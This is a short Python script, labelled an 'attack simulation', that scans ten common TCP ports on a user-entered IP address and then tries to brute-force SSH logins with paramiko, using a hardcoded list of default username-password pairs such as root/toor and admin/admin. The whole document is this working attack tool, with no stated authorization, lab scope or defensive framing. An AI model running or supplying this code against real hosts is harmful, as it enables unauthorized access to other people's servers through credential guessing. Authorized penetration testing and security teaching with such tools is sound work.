#!/usr/bin/env python3

import socket
import paramiko

# Top 10 common ports for scanning
TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443]

# Common SSH credentials for brute force testing
COMMON_CREDENTIALS = [
    ("root", "toor"),
    ("admin", "admin"),
    ("user", "password"),
    ("test", "123456"),
    ("admin", "admin1234")
]

def port_scan(target, ports=TOP_PORTS):
    """Performs a port scan on the target for the specified ports."""
    print(f"Starting port scan on {target}...")
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target, port))
                if result == 0:
                    print(f"Port {port}: OPEN")
                    open_ports.append(port)
                else:
                    print(f"Port {port}: CLOSED")
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    print(f"Open ports: {open_ports}")
    return open_ports

def ssh_brute_force(target, port=22, credentials=COMMON_CREDENTIALS):
    """Attempts to brute force SSH login on the target using common credentials."""
    print(f"Starting SSH brute force attack on {target}:{port}...")
    valid_credentials = []
    for username, password in credentials:
        try:
            print(f"Trying username: {username}, password: {password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, port=port, username=username, password=password, timeout=5)
            print(f"SUCCESS: Username '{username}' and password '{password}' worked!")
            valid_credentials.append((username, password))
            client.close()
            return username, password
        except paramiko.AuthenticationException:
            print("Failed: Invalid credentials.")
        except paramiko.SSHException as e:
            print(f"SSH Error: {e}")
            break
        except Exception as e:
            print(f"Connection Error: {e}")
    print("Brute force attack failed. No valid credentials found.")
    return valid_credentials if valid_credentials else None

def main():
    print("Attack Simulation Script")
    print("1. Port Scan")
    print("2. SSH Brute Force")
    choice = input("Choose an attack type (1/2): ").strip()

    target = input("Enter target IP address: ").strip()

    if choice == "1":
        ports = input(f"Enter ports to scan (comma-separated, or leave empty for default {TOP_PORTS}): ").strip()
        ports = [int(p) for p in ports.split(",")] if ports else TOP_PORTS
        port_scan(target, ports)
    elif choice == "2":
        port = input("Enter SSH port (default 22): ").strip()
        port = int(port) if port else 22
        ssh_brute_force(target, port)
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()